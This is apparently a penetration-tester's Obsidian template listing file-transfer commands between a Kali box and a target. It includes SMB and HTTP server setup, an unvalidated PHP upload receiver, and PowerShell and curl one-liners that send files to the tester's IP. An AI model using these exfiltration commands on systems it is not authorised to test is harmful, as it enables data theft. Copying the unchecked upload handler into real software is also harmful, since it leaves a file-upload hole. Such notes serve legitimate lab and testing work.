<%-* let os = String(tp.frontmatter.OS).toLowerCase() -%>
## File transfers

### Start SMB server with username/password
```bash
smbserver.py <name_of_share> <path/on/local/machine> -username kali -password kali -smb2support
```
### Start SMB server withoouth username/password
```bash
smbserver.py pwn <path/on/local/machine> -smb2support
```
<%* if (os === 'windows') { -%>
#### Transfer to kali from windows SMB
```powershell
copy <local file> \\<% tp.frontmatter.my_ip %>\pwn\<file>
```
<%-* } %>
### Start python web server
```bash
python -m http.server 80
```
### Start python web server in different directory
```bash
python -m http.server 80 --directory <path>
```

### Upload to your box
Make sure `/var/www/uploads` exists
```php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

<%-* if (os === 'windows') { -%>
#### Powershell oneliner to upload
```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://<% tp.frontmatter.my_ip %>', '<file>')
```
<%-* } else { -%>
#### oneliner to upload
```bash
curl -F 'file=@<path_to_file>' http://<% tp.frontmatter.my_ip %>
```
<%-* } %>
<%* if (os== 'linux') { -%>
<% tp.file.include("[[Templates/Linux]]") %>
<%-* } else if (os == 'windows') { -%>
<% tp.file.include("[[Templates/Windows]]") %>
<%-*} else { %>
<% os %> not valid
<%-*}-%>
